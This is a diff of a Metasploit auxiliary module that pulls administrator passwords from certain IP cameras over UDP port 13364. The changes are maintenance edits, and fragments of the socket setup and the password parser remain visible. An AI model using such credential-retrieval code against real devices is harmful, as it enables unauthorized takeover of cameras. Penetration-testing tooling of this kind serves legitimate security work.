@@ -1,14 +1,10 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
-  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Remote::Udp
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
@@ -20,7 +16,7 @@ class MetasploitModule < Msf::Auxiliary
         executable in order to retrieve passwords, allowing remote attackers to take
         administrative control over the device.  Other similar IP Cameras such as Edimax,
         Hawking, Zonet, etc, are also believed to have the same flaw, but not fully tested.
-        The protocol deisgn issue also allows attackers to reset passwords on the device.
+        The protocol design issue also allows attackers to reset passwords on the device.
       },
       'Author'      => 'Ben Schmidt',
       'License'     => MSF_LICENSE
@@ -30,7 +26,7 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::CHOST,
         Opt::RPORT(13364),
-      ], self.class)
+      ])
   end
 
   def run_host(ip)
@@ -42,8 +38,6 @@ class MetasploitModule < Msf::Auxiliary
     password = nil
 
     begin
-      # Create an unbound UDP socket if no CHOST is specified, otherwise
-      # create a UDP socket bound to CHOST (in order to avail of pivoting)
       udp_sock = Rex::Socket::Udp.create( {
         'LocalHost' => datastore['CHOST'] || nil,
         'PeerHost'  => ip,
@@ -75,7 +69,7 @@ class MetasploitModule < Msf::Auxiliary
 
     #Store the password if the parser returns something
     if password
-      print_status("Password retrieved: #{password.to_s}")
+      print_good("Password retrieved: #{password.to_s}")
       report_cred(
         ip: rhost,
         port: rport,
@@ -125,5 +119,4 @@ class MetasploitModule < Msf::Auxiliary
 
     return pkt[0][333,12] if pkt[0][6,4] == "\x01\x06\xff\xf9"
   end
-
 end
